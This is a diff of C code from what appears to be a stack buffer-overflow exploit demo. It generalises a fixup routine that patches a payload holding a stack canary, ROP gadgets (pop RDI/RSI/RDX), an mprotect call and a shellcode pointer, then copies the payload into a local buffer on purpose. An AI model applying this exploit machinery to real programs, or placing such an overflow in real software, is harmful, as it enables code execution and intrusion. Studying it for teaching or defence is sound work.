@@ -395,17 +395,14 @@ static void dumpload(PayloadPtr plp) {
 	printf("--------------------------------------------\n");
 } // dumpload()
 
-static void doFixups(PayloadPtr plp) {
+static void doFixups(Pointer p, size_t n) {
 	printf("In doFixups()\n");
 
-	plp->pl_canary    = fixupAddressUnion(plp->pl_canary);
-	plp->pl_rbp       = fixupAddressUnion(plp->pl_rbp);
-	plp->pl_popRDI    = fixupAddressUnion(plp->pl_popRDI);
-	plp->pl_stackPage = fixupAddressUnion(plp->pl_stackPage);
-	plp->pl_popRSI    = fixupAddressUnion(plp->pl_popRSI);
-	plp->pl_popRDX    = fixupAddressUnion(plp->pl_popRDX);
-	plp->pl_mprotect  = fixupAddressUnion(plp->pl_mprotect);
-        plp->pl_shellCode = fixupAddressUnion(plp->pl_shellCode); // Be sure that buffer_base is set by now.
+	// Perform fixups on anything in range, on 8 byte boundaries, that contains a valid fixup signature
+	for (AddressUnionPtr aup = (AddressUnionPtr)p; aup < (AddressUnionPtr) (p + n - sizeof(AddressUnionPtr) + 1); aup++) {
+		assert((((unsigned long) aup ) & 0x7) == 0);
+		*aup = fixupAddressUnion(*aup);
+	} // for
 } // doFixups()
 
 static void overflow(Pointer src, size_t n) {
@@ -415,8 +412,7 @@ static void overflow(Pointer src, size_t n) {
 
 	// Fixups
 	buffer_base = &dst;
-dumpload((PayloadPtr) src);
-	doFixups((PayloadPtr) src);
+	doFixups(src, n);
 dumpload((PayloadPtr) src);
 
 	memcpy(dst, src, n);
